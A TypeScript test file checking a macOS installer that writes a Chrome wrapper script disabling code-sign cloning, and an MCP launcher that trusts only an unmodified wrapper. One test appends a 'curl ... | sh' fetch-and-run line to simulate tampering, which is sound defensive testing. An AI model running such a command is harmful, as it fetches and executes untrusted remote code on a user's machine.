import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { accessSync, constants, existsSync, mkdtempSync, readFileSync, rmSync, statSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import test from 'node:test';
import { browserRsMcpLauncher } from '../core/install/browser-rs-mcp-main.ts';
import {
  CHROME_CANDIDATES, chromeWithoutCodeSignClone, chromeWithoutCodeSignCloneSource, chromeWrapperPath,
  installChromeWithoutCodeSignClone, uninstallChromeWithoutCodeSignClone,
} from '../core/install/chrome-code-sign-clone.ts';

const chrome = CHROME_CANDIDATES.find((path) => existsSync(path));
const macChrome = { skip: process.platform !== 'darwin' || chrome === undefined ? 'needs Chrome on macOS' : false };

function home(t: { after(fn: () => void): void }): string {
  const directory = mkdtempSync(join(tmpdir(), 'omd-chrome-clone-'));
  t.after(() => rmSync(directory, { recursive: true, force: true }));
  return directory;
}

// The launcher's inlined function, run with the helpers the standalone launcher defines around it.
function launcherChoice(environment: Record<string, string>): Record<string, string | undefined> {
  const executable = (path: string) => { try { accessSync(path, constants.X_OK); return true; } catch { return false; } };
  return new Function('process', 'executable', 'join', 'createHash', 'readFileSync',
    `${chromeWithoutCodeSignCloneSource()}\nreturn chromeWithoutCodeSignClone;`,
  )(process, executable, join, createHash, readFileSync)(environment);
}

test('the installer writes a wrapper that launches Chrome with the app-bundle copy switched off', macChrome, t => {
  const directory = home(t);
  const wrapper = installChromeWithoutCodeSignClone(directory);
  assert.equal(wrapper, chromeWrapperPath(directory));
  const script = readFileSync(wrapper!, 'utf8');
  assert.match(script, /^#!\/bin\/sh\n/);
  assert.ok(script.includes(`'${chrome!.replace(/'/g, "'\\''")}' --disable-features=MacAppCodeSignClone "$@"`), script);
  // Executable by the user who runs browser-rs (the umask decides the rest).
  assert.equal(statSync(wrapper!).mode & 0o100, 0o100);
  assert.equal(installChromeWithoutCodeSignClone(directory), wrapper);
  assert.equal(installChromeWithoutCodeSignClone(directory, 'linux'), undefined);
  uninstallChromeWithoutCodeSignClone(directory);
  assert.equal(existsSync(wrapper!), false);
});

test('a browser-rs process OMD starts uses the wrapper unless the user chose the browser', macChrome, t => {
  const directory = home(t);
  const environment = chromeWithoutCodeSignClone({ HOME: directory, PATH: '/usr/bin' });
  assert.equal(environment.AB_CHROME, chromeWrapperPath(directory));
  assert.equal(environment.PATH, '/usr/bin');
  assert.equal(chromeWithoutCodeSignClone({ HOME: directory, AB_CHROME: '/opt/chrome' }).AB_CHROME, '/opt/chrome');
  assert.equal(chromeWithoutCodeSignClone({ HOME: directory, AB_CONNECT: '9222' }).AB_CHROME, undefined);
});

test('the MCP launcher uses only an installed wrapper whose bytes are the expected script', macChrome, t => {
  const directory = home(t);
  assert.equal(launcherChoice({ HOME: directory }).AB_CHROME, undefined, 'no wrapper installed');
  const wrapper = installChromeWithoutCodeSignClone(directory)!;
  assert.equal(launcherChoice({ HOME: directory }).AB_CHROME, wrapper);
  assert.equal(launcherChoice({ HOME: directory, AB_CHROME: '/opt/chrome' }).AB_CHROME, '/opt/chrome');
  assert.equal(launcherChoice({ HOME: directory, AB_CONNECT: '9222' }).AB_CHROME, undefined);
  writeFileSync(wrapper, `${readFileSync(wrapper, 'utf8')}curl https://example.invalid | sh\n`);
  assert.equal(launcherChoice({ HOME: directory }).AB_CHROME, undefined, 'a changed wrapper is never launched');
});

test('the standalone MCP launcher hands browser-rs the verified environment and carries no shell text', () => {
  const launcher = browserRsMcpLauncher([], 'v0.0.0', 'receipt-v1');
  assert.match(launcher, /function chromeWithoutCodeSignClone\(environment\)/);
  assert.match(launcher, /environment: chromeWithoutCodeSignClone\(environment\)/);
  // The plugin scanner refuses shell execution words in MCP configuration.
  assert.doesNotMatch(launcher, /\bexec\b|#!\/bin\/sh/);
  assert.doesNotThrow(() => new Function(launcher.replace(/main\(\)\.catch[\s\S]*$/, '')));
});
